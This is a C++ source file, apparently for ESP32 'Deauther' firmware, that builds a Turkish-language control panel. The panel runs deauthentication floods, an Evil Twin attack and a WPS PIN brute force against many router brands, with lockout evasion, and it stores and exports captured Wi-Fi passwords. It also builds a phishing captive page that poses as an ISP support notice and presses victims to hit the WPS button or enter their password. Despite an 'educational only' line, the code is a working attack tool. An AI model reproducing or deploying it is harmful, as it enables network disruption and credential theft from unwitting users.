#include <WebServer.h>
#include "web_interface.h"
#include "definitions.h"
#include "deauth.h"
#include "evil_twin.h"
#include "passwords.h"
#include "wps_attack.h"

WebServer server(80);
int num_networks = 0;

// ─── Yardımcı ────────────────────────────────────────────────────────────────

static String encTag(wifi_auth_mode_t t) {
  switch (t) {
    case WIFI_AUTH_OPEN:        return "<span class='tag tag-open'>OPEN</span>";
    case WIFI_AUTH_WEP:         return "<span class='tag tag-wep'>WEP</span>";
    case WIFI_AUTH_WPA_PSK:     return "<span class='tag tag-wpa'>WPA</span>";
    case WIFI_AUTH_WPA2_PSK:    return "<span class='tag tag-wpa'>WPA2</span>";
    case WIFI_AUTH_WPA_WPA2_PSK:return "<span class='tag tag-wpa'>WPA/2</span>";
    default:                    return "<span class='tag tag-wep'>?</span>";
  }
}

static String getEncryptionType(wifi_auth_mode_t t) {
  switch (t) {
    case WIFI_AUTH_OPEN:         return "Open";
    case WIFI_AUTH_WEP:          return "WEP";
    case WIFI_AUTH_WPA_PSK:      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:     return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
    default:                     return "UNKNOWN";
  }
}

static void redirect_root() {
  server.sendHeader("Location", "/");
  server.send(301);
}

// Basit CSS — PROGMEM'e al
static const char CSS[] PROGMEM = R"(
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff;font-size:1.8em;margin-bottom:4px}
.sub{color:#8b949e;font-size:.82em;margin-bottom:22px}
h2{color:#f0f6fc;font-size:1.05em;margin-bottom:11px;display:flex;align-items:center;gap:8px}
.badge{font-size:.68em;padding:2px 8px;border-radius:10px;font-weight:700}
.b-red{background:#3d1a1a;color:#f85149}
.b-orange{background:#2d1f0e;color:#f0883e}
.b-green{background:#0d2818;color:#3fb950}
.b-blue{background:#0d1f3c;color:#58a6ff}
.b-purple{background:#2d1060;color:#bc8cff}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px;margin-bottom:16px}
table{width:100%;border-collapse:collapse;font-size:.88em}
th{background:#21262d;color:#8b949e;padding:9px 11px;text-align:left;font-weight:600;font-size:.78em;text-transform:uppercase;letter-spacing:.4px}
td{padding:9px 11px;border-top:1px solid #21262d}
tr:hover td{background:#1c2128}
input[type=text],input[type=number],input[type=password]{width:100%;padding:9px 11px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:.9em;margin-bottom:9px;outline:none}
input:focus{border-color:#58a6ff}
.btn{display:inline-block;width:100%;padding:10px;border:none;border-radius:6px;font-size:.88em;font-weight:700;cursor:pointer;transition:opacity .2s}
.btn:hover{opacity:.82}
.btn-blue{background:#1f6feb;color:#fff}
.btn-red{background:#b62324;color:#fff}
.btn-orange{background:#9b4400;color:#fff}
.btn-purple{background:#6e40c9;color:#fff}
.btn-gray{background:#21262d;color:#c9d1d9;border:1px solid #30363d}
.btn-sm{padding:5px 12px;width:auto;font-size:.8em}
.row{display:flex;gap:11px}
.row>*{flex:1}
.statbar{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:11px 15px;margin-bottom:16px;display:flex;gap:22px;flex-wrap:wrap}
.stat .lbl{color:#8b949e;font-size:.72em;text-transform:uppercase;letter-spacing:.4px}
.stat .val{color:#f0f6fc;font-weight:700;font-size:1.1em}
.val.ok{color:#3fb950}.val.danger{color:#f85149}.val.warn{color:#f0883e}
hr{border:none;border-top:1px solid #21262d;margin:14px 0}
.hint{color:#8b949e;font-size:.8em;margin-bottom:9px}
.alert-ok{background:#0d2818;border:1px solid #3fb950;border-radius:6px;padding:11px;margin-bottom:9px;color:#3fb950}
.alert-err{background:#3d1a1a;border:1px solid #f85149;border-radius:6px;padding:11px;margin-bottom:9px;color:#f85149}
.tag{padding:2px 7px;border-radius:4px;font-size:.74em;font-weight:700}
.tag-open{background:#0d2818;color:#3fb950}
.tag-wpa{background:#0d1f3c;color:#58a6ff}
.tag-wep{background:#2d1f0e;color:#f0883e}
.pw-row{display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-top:1px solid #21262d}
.pw-row:first-child{border-top:none}
.pw-info{display:flex;flex-direction:column;gap:3px}
.pw-ssid{font-weight:700;color:#f0f6fc;font-size:.9em}
.pw-pass{font-family:monospace;color:#3fb950;font-size:.95em;background:#0d1117;padding:3px 8px;border-radius:4px}
)";

// ─── Yönetim Ana Sayfası ──────────────────────────────────────────────────────

void handle_root() {
  bool attack_running = evil_twin_active ||
    (deauth_type == DEAUTH_TYPE_SINGLE && deauth_target_ssid[0] != '\0');

  String html = F("<!DOCTYPE html><html lang='tr'><head>"
    "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>ESP32 Deauther</title>");
  if (attack_running) html += F("<meta http-equiv='refresh' content='4'>");
  html += F("<style>");
  html += FPSTR(CSS);
  html += F("</style></head><body>");

  html += F("<h1>&#128246; ESP32 Deauther</h1>"
            "<p class='sub'>Wi-Fi guvenlik arac&#305; &mdash; Yaln&#305;zca egitim amacl&#305;</p>");

  // Durum paneli
  html += F("<div class='statbar'>");
  html += "<div class='stat'><div class='lbl'>Ag</div><div class='val'>" + String(num_networks) + "</div></div>";
  html += "<div class='stat'><div class='lbl'>Deauth</div><div class='val danger'>" + String(eliminated_stations) + "</div></div>";
  html += "<div class='stat'><div class='lbl'>Kaydedilen</div><div class='val ok'>" + String(passwords_count()) + "</div></div>";
  if (evil_twin_active) {
    html += "<div class='stat'><div class='lbl'>ET SSID</div><div class='val ok'>" + evil_twin_ssid + "</div></div>";
    html += "<div class='stat'><div class='lbl'>ET Istemci</div><div class='val warn'>" + String(evil_twin_clients) + "</div></div>";
  }
  html += F("</div>");

  // Ağ tablosu
  html += F("<div class='card'><h2>&#128225; Wi-Fi Aglari</h2><table>"
            "<tr><th>#</th><th>SSID</th><th>BSSID</th><th>Kanal</th><th>RSSI</th><th>Sifrelem</th></tr>");
  for (int i = 0; i < num_networks; i++) {
    String ssid_disp = WiFi.SSID(i);
    if (ssid_disp.length() == 0) ssid_disp = "<i style='color:#8b949e'>(Gizli)</i>";
    html += "<tr><td>" + String(i) + "</td><td><b>" + ssid_disp + "</b></td>"
            "<td style='font-size:.8em;color:#8b949e'>" + WiFi.BSSIDstr(i) + "</td>"
            "<td>" + String(WiFi.channel(i)) + "</td>"
            "<td>" + String(WiFi.RSSI(i)) + " dBm</td>"
            "<td>" + encTag(WiFi.encryptionType(i)) + "</td></tr>";
  }
  html += F("</table><hr>"
            "<form method='post' action='/rescan'>"
            "<button class='btn btn-gray' type='submit'>&#128260; Yeniden Tara</button>"
            "</form></div>");

  // Deauth tek ağ
  html += F("<div class='card'><h2>&#9889; Deauth Saldirisi <span class='badge b-red'>Tek Ag</span></h2>"
            "<p class='hint'>Belirli bir aga bagli istemcileri kopar.</p>"
            "<form method='post' action='/deauth'>");
  html += "<input type='number' name='net_num' placeholder='Ag Numarasi (0-" + String(max(0, num_networks - 1)) + ")' min='0'>";
  html += F("<input type='number' name='reason' placeholder='Neden Kodu' value='1'>"
            "<button class='btn btn-red' type='submit'>&#9889; Deauth Baslatı</button>"
            "</form></div>");

  // Deauth tümü
  html += F("<div class='card'><h2>&#128165; Tum Aglara Deauth <span class='badge b-orange'>Uyari</span></h2>"
            "<p class='hint'>Tum kanallar tarandi, tum istemciler deauth edilir. Durdurmak icin ESP32 resetlenmelidir.</p>"
            "<form method='post' action='/deauth_all'>"
            "<input type='number' name='reason' placeholder='Neden Kodu' value='1'>"
            "<button class='btn btn-orange' type='submit'>&#128165; Tumune Saldır</button>"
            "</form></div>");

  // Evil Twin
  html += F("<div class='card'><h2>&#128126; Evil Twin <span class='badge b-purple'>Sifre Yakala</span></h2>");
  if (evil_twin_active) {
    html += "<div class='alert-ok'>&#9679; Aktif: <b>" + evil_twin_ssid + "</b> &mdash; " +
            String(evil_twin_clients) + " istemci bagli</div>";

    // WPS PBC durum göstergesi
    if (et_wps_pbc_found) {
      html += F("<div class='alert-ok' style='margin-top:8px'>&#128273; WPS PBC: "
                "Sifre basariyla yakalandi!</div>");
    } else if (et_wps_pbc_running) {
      html += F("<div style='background:#1a1f0e;border:1px solid #f0883e;border-radius:6px;"
                "padding:9px 11px;margin-top:8px;color:#f0883e;font-size:.85em'>"
                "&#9711; WPS PBC bekliyor &mdash; kullanici WPS tusuna bassın...</div>");
    }

    html += F("<p class='hint' style='margin-top:10px'>Portal modu: WPS tusu sayfasi veya sifre formu. "
              "WPS PBC etkinse portal otomatik WPS sayfasini gosterir.</p>");

    // WPS PBC toggle butonu
    if (!et_wps_pbc_running && !et_wps_pbc_found) {
      html += F("<form method='post' action='/wps_pbc_start' style='margin-bottom:8px'>"
                "<button class='btn btn-orange' type='submit'>"
                "&#128275; Portal: WPS Tusu Modunu Etkinlestir</button>"
                "</form>");
    } else if (et_wps_pbc_running) {
      html += F("<form method='post' action='/wps_pbc_stop' style='margin-bottom:8px'>"
                "<button class='btn btn-gray' type='submit'>"
                "&#9632; WPS PBC Modunu Durdur</button>"
                "</form>");
    }

    html += F("<form method='post' action='/stop_evil_twin'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Evil Twin Durdur</button>"
              "</form>");
  } else {
    html += F("<p class='hint'>Hedef agin SSID ini klonlar, gercek AP ye deauth gonderir. Istemci sahte aga baglandi"
              "ginda sifre girmesi istenir. Dogru sifre bulunursa otomatik kaydedilir ve saldiri durur.</p>"
              "<form method='post' action='/evil_twin'>");
    html += "<input type='number' name='net_num' placeholder='Hedef Ag Numarasi (0-" + String(max(0, num_networks - 1)) + ")' min='0'>";
    html += F("<button class='btn btn-purple' type='submit'>&#128126; Evil Twin Baslatı</button>"
              "</form>");
  }
  html += F("</div>");

  // ── WPS PIN Brute Force ──────────────────────────────────────────────────
  html += F("<div class='card'><h2>&#128273; WPS PIN Saldirisi <span class='badge b-blue'>Brute Force</span></h2>");
  html += F("<div id='wps-status'>");

  // Aktif veya lockout durumunda vendor / MAC / lockout bilgisi göster
  if (wps_attack_state == WPS_ATTACKING || wps_attack_state == WPS_LOCKED_OUT ||
      wps_attack_state == WPS_SUCCESS   || wps_attack_state == WPS_EXHAUSTED) {
    // Vendor bilgisi
    if (wps_vendor_name[0] != '\0') {
      html += "<div style='display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px'>"
              "<span style='background:#1a2d1a;color:#3fb950;border:1px solid #3fb950;"
              "border-radius:4px;padding:2px 8px;font-size:.8em'>&#127968; Vendor: <b>"
              + String(wps_vendor_name) + "</b></span>";
      // MAC adresi
      char macStr[20];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
        wps_current_mac[0], wps_current_mac[1], wps_current_mac[2],
        wps_current_mac[3], wps_current_mac[4], wps_current_mac[5]);
      html += "<span style='background:#1a1a2d;color:#79c0ff;border:1px solid #388bfd;"
              "border-radius:4px;padding:2px 8px;font-size:.8em'>&#128100; MAC: <b>"
              + String(macStr) + "</b></span>";
      // Lockout sayacı
      if (wps_lockout_count > 0) {
        html += "<span style='background:#2d1a00;color:#f0883e;border:1px solid #d29922;"
                "border-radius:4px;padding:2px 8px;font-size:.8em'>&#128274; Lockout: <b>"
                + String(wps_lockout_count) + "x</b></span>";
      }
      html += "</div>";
    }
  }

  if (wps_attack_state == WPS_SUCCESS) {
    html += "<div class='alert-ok'>&#9989; PIN Bulundu! <b>" + String(wps_found_pin) + "</b><br>"
            "SSID: <b>" + String(wps_found_ssid) + "</b><br>"
            "Sifre: <span class='pw-pass'>" + String(wps_found_pass) + "</span></div>";
    html += F("<form method='post' action='/wps_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Temizle</button>"
              "</form>");
  } else if (wps_attack_state == WPS_LOCKED_OUT) {
    // Lockout bekleme durumu
    html += "<div style='color:#d29922;background:#2d1f0e;border:1px solid #d29922;"
            "border-radius:6px;padding:11px;margin-bottom:9px'>"
            "&#9203; AP Rate-Limit / Lockout tespit edildi! Bekleniyor... "
            "(&nbsp;" + String(wps_attempt) + "/" + String(wps_total) + " denendi&nbsp;)</div>";
    html += F("<form method='post' action='/wps_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Durdur</button>"
              "</form>");
  } else if (wps_attack_state == WPS_ATTACKING) {
    int pct = (wps_total > 0) ? (wps_attempt * 100 / wps_total) : 0;
    html += "<div style='color:#f0883e;background:#2d1a00;border:1px solid #f0883e;"
            "border-radius:6px;padding:11px;margin-bottom:9px'>"
            "&#128260; Deneniyor: <b>" + String(wps_current_pin) + "</b>"
            " &mdash; " + String(wps_attempt) + "/" + String(wps_total) + "</div>";
    html += "<div style='background:#21262d;border-radius:4px;height:8px;margin-bottom:12px'>"
            "<div style='background:#1f6feb;height:8px;border-radius:4px;width:"
            + String(pct) + "%'></div></div>";
    html += F("<form method='post' action='/wps_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Durdur</button>"
              "</form>");
  } else if (wps_attack_state == WPS_EXHAUSTED) {
    html += F("<div class='alert-err'>&#10060; Tum PIN'ler denendi, basarili olamadi.</div>");
    html += F("<form method='post' action='/wps_scan'>"
              "<button class='btn btn-gray' type='submit'>&#128260; Yeniden Tara</button>"
              "</form>");
  } else {
    html += F("<p class='hint'>Modem: ZTE / Huawei / Zyxel / TP-Link / Sagemcom / Arcadyan / D-Link / Netgear"
              " / Technicolor / Fritz!Box / Arris / Compal / Sercomm / Cisco / Sagem / Comtrend"
              " / Actiontec / Gemtek / Iskratel &mdash; "
              "Router: ASUS / Linksys / Belkin / Tenda / Mercusys / Xiaomi / Buffalo / MikroTik / Netis &mdash; "
              "MAC rotasyonu ve lockout korumalari aktif.</p>");
    if (wps_target_count > 0) {
      html += F("<form method='post' action='/wps_attack'>"
                "<select name='target_idx' style='width:100%;margin-bottom:10px;padding:9px;"
                "background:#0d1117;color:#f0f6fc;border:1px solid #30363d;border-radius:6px'>");
      for (int i = 0; i < wps_target_count; i++) {
        String sname = String(wps_targets[i].ssid);
        if (sname.length() == 0) sname = "(Gizli)";
        // Vendor badge
        const char *vbadge = "";
        switch (wps_targets[i].vendor) {
          case VENDOR_ZTE:         vbadge = " [ZTE]";           break;
          case VENDOR_HUAWEI:      vbadge = " [Huawei]";        break;
          case VENDOR_ZYXEL:       vbadge = " [Zyxel]";         break;
          case VENDOR_TPLINK:      vbadge = " [TP-Link]";       break;
          case VENDOR_SAGEMCOM:    vbadge = " [Sagemcom]";      break;
          case VENDOR_ARCADYAN:    vbadge = " [Arcadyan]";      break;
          case VENDOR_DLINK:       vbadge = " [D-Link]";        break;
          case VENDOR_NETGEAR:     vbadge = " [Netgear]";       break;
          case VENDOR_ASUS:        vbadge = " [ASUS]";          break;
          case VENDOR_LINKSYS:     vbadge = " [Linksys]";       break;
          case VENDOR_BELKIN:      vbadge = " [Belkin]";        break;
          case VENDOR_TENDA:       vbadge = " [Tenda]";         break;
          case VENDOR_MERCUSYS:    vbadge = " [Mercusys]";      break;
          case VENDOR_TECHNICOLOR: vbadge = " [Technicolor]";   break;
          case VENDOR_FRITZ:       vbadge = " [Fritz!Box]";     break;
          case VENDOR_ARRIS:       vbadge = " [Arris]";         break;
          case VENDOR_XIAOMI:      vbadge = " [Xiaomi]";        break;
          case VENDOR_BUFFALO:     vbadge = " [Buffalo]";       break;
          case VENDOR_MIKROTIK:    vbadge = " [MikroTik]";      break;
          case VENDOR_COMPAL:      vbadge = " [Compal]";        break;
          case VENDOR_SERCOMM:     vbadge = " [Sercomm]";       break;
          case VENDOR_NETIS:       vbadge = " [Netis]";         break;
          case VENDOR_CISCO:       vbadge = " [Cisco]";         break;
          case VENDOR_SAGEM:       vbadge = " [Sagem]";         break;
          case VENDOR_COMTREND:    vbadge = " [Comtrend]";      break;
          case VENDOR_ACTIONTEC:   vbadge = " [Actiontec]";     break;
          case VENDOR_GEMTEK:      vbadge = " [Gemtek]";        break;
          case VENDOR_ISKRATEL:    vbadge = " [Iskratel]";      break;
          default: break;
        }
        html += "<option value='" + String(i) + "'>"
              + sname + vbadge
              + " &mdash; " + String(wps_targets[i].rssi) + " dBm"
              + " (Kanal " + String(wps_targets[i].channel) + ")</option>";
      }
      html += F("</select>"
                "<button class='btn btn-blue' type='submit' style='margin-bottom:8px'>"
                "&#128273; Saldiri Baslatı</button>"
                "</form><hr style='margin:10px 0'>");
    }
    html += F("<form method='post' action='/wps_scan'>"
              "<button class='btn btn-gray' type='submit'>&#128225; WPS Aglarini Tara</button>"
              "</form>");
  }
  html += F("</div>");  // close wps-status
  html += F("</div>");  // close card

  // Durdur
  html += F("<div class='row' style='margin-bottom:16px'>"
            "<form method='post' action='/stop'>"
            "<button class='btn btn-gray' type='submit'>&#9632; Deauth Durdur</button>"
            "</form></div>");

  // Kaydedilen şifreler
  html += F("<div class='card'><h2>&#128274; Kaydedilen Sifreler");
  int pw_count = passwords_count();
  html += " <span class='badge b-green'>" + String(pw_count) + "</span></h2>";
  if (pw_count == 0) {
    html += F("<p class='hint'>Henuz kaydedilmis sifre yok.</p>");
  } else {
    for (int i = 0; i < pw_count; i++) {
      SavedPassword sp = passwords_get(i);
      html += "<div class='pw-row'><div class='pw-info'>"
              "<span class='pw-ssid'>&#128225; " + sp.ssid + "</span>"
              "<span class='pw-pass'>" + sp.password + "</span>"
              "</div>"
              "<form method='post' action='/delete_pw' style='width:auto'>"
              "<input type='hidden' name='idx' value='" + String(i) + "'>"
              "<button class='btn btn-red btn-sm' type='submit'>&#128465; Sil</button>"
              "</form></div>";
    }
    html += F("<hr><div class='row'>"
              "<form method='post' action='/clear_pw' style='flex:1'>"
              "<button class='btn btn-gray btn-sm' style='width:100%' type='submit'>&#128465; Tumunu Sil</button>"
              "</form>"
              "<a href='/export_pw' style='flex:1;display:block'>"
              "<button class='btn btn-blue btn-sm' style='width:100%' type='button'>&#128229; Indir (.txt)</button>"
              "</a>"
              "</div>");
  }
  html += F("</div>");

  // ── Gerçek zamanlı WPS ilerleme JS ────────────────────────────────────────
  bool wps_live_now = (wps_attack_state == WPS_ATTACKING ||
                       wps_attack_state == WPS_LOCKED_OUT);
  html += F("<script>");
  html += "var _wL=" + String(wps_live_now ? 1 : 0) + ";";
  html += F(
    "function wpsB(d){"
      "var h='';"
      "if(d.vendor){"
        "h+='<div style=\"display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px\">';"
        "h+='<span style=\"background:#1a2d1a;color:#3fb950;border:1px solid #3fb950;"
              "border-radius:4px;padding:2px 8px;font-size:.8em\">&#127968; Vendor: <b>'+d.vendor+'</b></span>';"
        "h+='<span style=\"background:#1a1a2d;color:#79c0ff;border:1px solid #388bfd;"
              "border-radius:4px;padding:2px 8px;font-size:.8em\">&#128100; MAC: <b>'+d.mac+'</b></span>';"
        "if(d.lockout>0)h+='<span style=\"background:#2d1a00;color:#f0883e;border:1px solid #d29922;"
              "border-radius:4px;padding:2px 8px;font-size:.8em\">&#128274; Lockout: <b>'+d.lockout+'x</b></span>';"
        "h+='</div>';"
      "}"
      "if(d.state==='attacking'){"
        "var pct=d.total>0?Math.round(d.attempt*100/d.total):0;"
        "h+='<div style=\"color:#f0883e;background:#2d1a00;border:1px solid #f0883e;"
              "border-radius:6px;padding:11px;margin-bottom:9px\">&#128260; Deneniyor: <b>'+d.pin+'</b>"
              " &mdash; '+d.attempt+'/'+d.total+'</div>';"
        "h+='<div style=\"background:#21262d;border-radius:4px;height:8px;margin-bottom:12px\">"
              "<div style=\"background:#1f6feb;height:8px;border-radius:4px;width:'+pct+'%\"></div></div>';"
        "h+='<form method=\"post\" action=\"/wps_stop\"><button class=\"btn btn-gray\" type=\"submit\">&#9632; Durdur</button></form>';"
      "} else if(d.state==='locked'){"
        "h+='<div style=\"color:#d29922;background:#2d1f0e;border:1px solid #d29922;"
              "border-radius:6px;padding:11px;margin-bottom:9px\">&#9203; AP Rate-Limit / Lockout! Bekleniyor... ('+"
        "d.attempt+'/'+d.total+' denendi)</div>';"
        "h+='<form method=\"post\" action=\"/wps_stop\"><button class=\"btn btn-gray\" type=\"submit\">&#9632; Durdur</button></form>';"
      "} else if(d.state==='success'){"
        "h+='<div class=\"alert-ok\">&#9989; PIN Bulundu! <b>'+d.found_pin+'</b><br>"
              "SSID: <b>'+d.found_ssid+'</b><br>"
              "Sifre: <span class=\"pw-pass\">'+d.found_pass+'</span></div>';"
        "h+='<form method=\"post\" action=\"/wps_stop\"><button class=\"btn btn-gray\" type=\"submit\">&#9632; Temizle</button></form>';"
        "_wL=0;"
      "} else if(d.state==='exhausted'){"
        "h+='<div class=\"alert-err\">&#10060; Tum PIN&#39;ler denendi, basarili olamadi.</div>';"
        "h+='<form method=\"post\" action=\"/wps_scan\"><button class=\"btn btn-gray\" type=\"submit\">&#128260; Yeniden Tara</button></form>';"
        "_wL=0;"
      "} else { _wL=0; }"
      "var el=document.getElementById('wps-status');"
      "if(el&&d.state!=='idle'&&d.state!=='stopped')el.innerHTML=h;"
    "}"
    "function wpsPoll(){"
      "if(!_wL)return;"
      "fetch('/wps_status')"
        ".then(function(r){return r.json();})"
        ".then(function(d){"
          "_wL=(d.state==='attacking'||d.state==='locked')?1:0;"
          "wpsB(d);"
          "setTimeout(wpsPoll,1500);"
        "})"
        ".catch(function(){if(_wL)setTimeout(wpsPoll,3000);});"
    "}"
    "if(_wL)setTimeout(wpsPoll,1500);"
  );
  html += F("</script>");
  html += F("</body></html>");

  server.send(200, "text/html", html);
}

// ─── WPS PBC + Şifre Kombine Portal Sayfası ──────────────────────────────────
// Hem WPS PBC hem de şifre formu aynı sayfada — görsel modem diyagramı ile.
// Sıradan kullanıcının bile anlayabileceği sade Türkçe talimatlar.
static String portal_wps_page() {
  String ssid = evil_twin_ssid;

  // ── CSS ──────────────────────────────────────────────────────────────────
  String h = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'>"
    "<meta http-equiv='refresh' content='6; url=/portal'>"
    "<title>&#304;nternet Ba&#287;lant&#305; Sorunu</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
    "body{font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;"
      "background:#f0f2f5;color:#1a1a2e;min-height:100vh}"

    // ISP header bandı
    ".hdr{background:linear-gradient(90deg,#c0392b,#e74c3c);"
      "padding:14px 20px;display:flex;align-items:center;gap:12px;color:#fff;"
      "box-shadow:0 2px 8px rgba(0,0,0,.25)}"
    ".hdr-ico{width:38px;height:38px;background:rgba(255,255,255,.18);"
      "border-radius:50%;display:flex;align-items:center;justify-content:center;"
      "font-size:20px;flex-shrink:0}"
    ".hdr-title{font-size:1em;font-weight:700;letter-spacing:-.2px}"
    ".hdr-sub{font-size:.75em;opacity:.85;margin-top:2px}"

    // Uyarı şeridi
    ".warn-bar{background:#fff3cd;border-bottom:2px solid #f0b429;"
      "padding:11px 20px;font-size:.85em;color:#7d4e00;"
      "display:flex;align-items:center;gap:8px;line-height:1.4}"

    // Ana içerik
    ".wrap{max-width:480px;margin:0 auto;padding:16px 14px 32px}"

    // Ağ adı etiketi
    ".net-lbl{background:#fff;border:1px solid #dde1ea;border-radius:10px;"
      "padding:11px 15px;display:flex;align-items:center;gap:10px;"
      "margin-bottom:16px;box-shadow:0 1px 3px rgba(0,0,0,.07)}"
    ".net-lbl .wifi-ico{font-size:22px}"
    ".net-name{font-weight:700;color:#1a1a2e;font-size:.95em;word-break:break-all}"
    ".net-sub{font-size:.72em;color:#888;margin-top:1px}"

    // Yöntem kutuları
    ".method{background:#fff;border-radius:14px;margin-bottom:14px;"
      "overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.08);border:1px solid #e0e4ed}"
    ".m-head{padding:13px 16px;display:flex;align-items:center;gap:10px;color:#fff}"
    ".m-head.wps{background:linear-gradient(90deg,#1565c0,#1976d2)}"
    ".m-head.pw{background:linear-gradient(90deg,#2e7d32,#388e3c)}"
    ".m-badge{background:rgba(255,255,255,.22);font-size:.65em;font-weight:800;"
      "padding:2px 8px;border-radius:10px;letter-spacing:.4px;text-transform:uppercase}"
    ".m-head-title{font-weight:700;font-size:1em;flex:1}"
    ".m-body{padding:16px}"

    // WPS görsel
    ".modem-diagrams{display:flex;gap:10px;justify-content:center;margin-bottom:14px;flex-wrap:wrap}"
    ".diag-wrap{text-align:center}"
    ".diag-lbl{font-size:.68em;color:#888;margin-top:5px;font-weight:600}"

    // WPS adımları
    ".wps-steps{display:flex;flex-direction:column;gap:0}"
    ".ws{display:flex;align-items:flex-start;gap:12px;padding:10px 0;"
      "border-bottom:1px solid #f0f2f5}"
    ".ws:last-child{border-bottom:none}"
    ".ws-num{width:30px;height:30px;border-radius:50%;background:#1565c0;"
      "color:#fff;font-weight:800;font-size:.8em;display:flex;"
      "align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}"
    ".ws-txt{font-size:.88em;color:#333;line-height:1.55}"
    ".ws-txt b{color:#1a1a2e}"
    ".ws-txt .note{font-size:.82em;color:#888;margin-top:2px;display:block}"

    // WPS bekleme animasyonu
    ".wps-wait{background:#e3f2fd;border:1px solid #90caf9;border-radius:8px;"
      "padding:10px 14px;margin-top:12px;display:flex;align-items:center;gap:10px;"
      "font-size:.82em;color:#1565c0}"
    ".spin-sm{width:16px;height:16px;border:2px solid #90caf9;"
      "border-top-color:#1565c0;border-radius:50%;"
      "animation:spin .8s linear infinite;flex-shrink:0}"
    "@keyframes spin{to{transform:rotate(360deg)}}"

    // Ayraç
    ".or-div{display:flex;align-items:center;gap:10px;margin:4px 0 14px;color:#aaa;font-size:.8em}"
    ".or-div::before,.or-div::after{content:'';flex:1;height:1px;background:#dde1ea}"

    // Şifre formu
    ".pw-field{position:relative;margin-bottom:10px}"
    ".pw-inp{width:100%;height:50px;border:2px solid #dde1ea;border-radius:10px;"
      "padding:0 48px 0 14px;font-size:1em;color:#1a1a2e;background:#f8f9fc;"
      "outline:none;font-family:inherit;transition:border-color .2s}"
    ".pw-inp:focus{border-color:#2e7d32;background:#fff}"
    ".pw-inp::placeholder{color:#b0b4c0}"
    ".eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);"
      "background:none;border:none;cursor:pointer;color:#888;padding:4px;font-size:18px}"
    ".pw-hint{font-size:.75em;color:#999;margin-bottom:14px;padding-left:4px}"
    ".pw-btn{width:100%;height:50px;background:linear-gradient(90deg,#2e7d32,#43a047);"
      "color:#fff;border:none;border-radius:10px;font-size:1em;font-weight:700;"
      "cursor:pointer;font-family:inherit;letter-spacing:.2px;transition:opacity .2s}"
    ".pw-btn:hover{opacity:.88}"

    "</style></head><body>");

  // ── ISP Header ────────────────────────────────────────────────────────────
  h += F("<div class='hdr'>"
    "<div class='hdr-ico'>&#128225;</div>"
    "<div>"
      "<div class='hdr-title'>Ba&#287;lant&#305; Hizmetleri</div>"
      "<div class='hdr-sub'>Geni&#351;bant Destek Portal&#305;</div>"
    "</div>"
  "</div>"
  "<div class='warn-bar'>"
    "&#9888;&#65039;&nbsp;"
    "<span><b>&#304;nternet ba&#287;lant&#305;n&#305;z ge&#231;ici olarak kesildi.</b>"
    " Tekrar ba&#287;lanmak i&#231;in a&#351;a&#287;&#305;daki y&#246;ntemlerden birini uygulay&#305;n.</span>"
  "</div>"
  "<div class='wrap'>");

  // ── Ağ adı göster ────────────────────────────────────────────────────────
  h += F("<div class='net-lbl'>"
    "<span class='wifi-ico'>&#128225;</span>"
    "<div><div class='net-name'>");
  h += ssid;
  h += F("</div>"
      "<div class='net-sub'>Bu a&#287; i&#231;in yeniden do&#287;rulama gerekiyor</div>"
    "</div>"
  "</div>");

  // ══════════════════════════════════════════════════════════════════════════
  // YÖNTEM 1 — WPS ile Bağlan
  // ══════════════════════════════════════════════════════════════════════════
  h += F("<div class='method'>"
    "<div class='m-head wps'>"
      "<span style='font-size:22px'>&#128275;</span>"
      "<span class='m-head-title'>Y&#214;NTEM 1 &mdash; WPS Tu&#351;u ile Ba&#287;lan</span>"
      "<span class='m-badge'>&#214;nerilen</span>"
    "</div>"
    "<div class='m-body'>"
      "<p style='font-size:.85em;color:#555;margin-bottom:14px;line-height:1.55'>"
        "Modemin/router&#305;n&#305;z&#305;n &#252;zerindeki <b>WPS tu&#351;una</b> basarak"
        " internet ba&#287;lant&#305;n&#305;z&#305; kolayca yenileyebilirsiniz."
        " Hi&#231;bir &#351;ifre girmenize gerek yok."
      "</p>");

  // ── SVG Modem Diyagramları ───────────────────────────────────────────────
  h += F("<div class='modem-diagrams'>"

    // Diyagram 1: Dikey modem (ZTE/Huawei/Sagemcom tipi) — WPS önde
    "<div class='diag-wrap'>"
    "<svg width='110' height='130' viewBox='0 0 110 130' xmlns='http://www.w3.org/2000/svg'>"
      // Modem gövdesi
      "<rect x='20' y='8' width='70' height='110' rx='8' fill='#2c3e50'/>"
      "<rect x='24' y='12' width='62' height='102' rx='6' fill='#34495e'/>"
      // LED ışıkları (üstte)
      "<circle cx='35' cy='24' r='3' fill='#2ecc71'/>"
      "<circle cx='45' cy='24' r='3' fill='#2ecc71'/>"
      "<circle cx='55' cy='24' r='3' fill='#f39c12' opacity='0.6'/>"
      "<circle cx='65' cy='24' r='3' fill='#e74c3c' opacity='0.4'/>"
      // WPS tuşu (parlayan, büyük)
      "<rect x='32' y='80' width='46' height='22' rx='11' fill='#1565c0' "
        "style='filter:drop-shadow(0 0 6px #42a5f5)'/>"
      "<text x='55' y='95' text-anchor='middle' fill='white' "
        "font-size='9' font-weight='bold' font-family='Arial'>WPS</text>"
      // Ok işareti - WPS tuşuna
